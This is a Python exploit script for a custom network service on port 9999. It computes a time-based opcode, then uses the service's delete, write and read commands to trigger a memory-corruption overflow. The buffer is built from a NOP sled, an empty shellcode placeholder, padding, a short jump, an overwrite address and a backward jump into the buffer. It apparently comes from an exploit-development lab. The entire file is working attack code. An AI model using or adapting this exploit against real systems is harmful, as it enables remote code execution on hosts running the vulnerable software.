#!/usr/bin/python
import socket
import sys
from struct import pack
import time


server = sys.argv[1]
port = 9999


def send_message(s, buffer):
    s.send(buffer)


def get_opcode():
    current_time = int(time.time()) // 10
    last_digits = str(hex(current_time))[-2:]
    val = int(last_digits, 16)
    val2 = val*val
    val3 = val*val*val
    val4 = val*val*val*val
    aux = val3 // 0x100 * 0x100
    aux = aux * 0x10
    aux = aux | val2
    aux = aux // 0x10 * 0x10
    aux2 = val4  // 0x1000 * 0x1000
    aux2 = aux2 * 0x100
    aux3 = aux | aux2
    aux3 = aux3 * 0x10
    aux3 = aux3 | val
    aux4 = str(hex(aux3))[-8:]
    aux4 = int(aux4, 16) 
    aux4 = aux4 ^ int("0x74829726",16)
    return hex(aux4)


def write_file(text):
    print("Writing content to file (Opcode 1)")
    opcode = get_opcode()
    print("OTD: %s\n"%opcode)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    buffer = pack("<L", int(opcode, 16))
    send_message(s, buffer)
    buffer2 = pack("<L", 0x1)
    send_message(s, buffer2)
    buffer3 = text
    send_message(s, buffer3)
    s.close()


def read_file():
    print("Reading content from file (Opcode 2)")
    opcode = get_opcode()
    print("OTD: %s\n"%opcode)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    buffer = pack("<L", int(opcode, 16))
    send_message(s, buffer)
    buffer2 = pack("<L", 0x2)
    send_message(s, buffer2)
    res = (s.recv(1024))
    print(res)
    s.close()


def delete_file():
    print("Deleting content from file (Opcode 3)")
    opcode = get_opcode()
    print("OTD: %s\n"%opcode)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    buffer = pack("<L", int(opcode, 16))
    send_message(s, buffer)
    buffer2 = pack("<L", 0x3)
    send_message(s, buffer2)
    s.close()


def main():
    delete_file()
    time.sleep(5)
    write_file(b"E"*0x800)
    time.sleep(5)
    payload = b"" # ADD PAYLOAD
    buff =  b"\x90"*24
    buff += payload
    buff += b"A"*(806-len(buff))
    buff += b"\x90\x90\xeb\x04"
    buff += pack("<L", 0x60ae20d3) # bp 0x60ae20d3; g
    buff += b"\xe9\xcd\xfc\xff\xff"
    buff += b"D"*(2048-len(buff))
    write_file(buff)
    time.sleep(5)
    read_file()


main()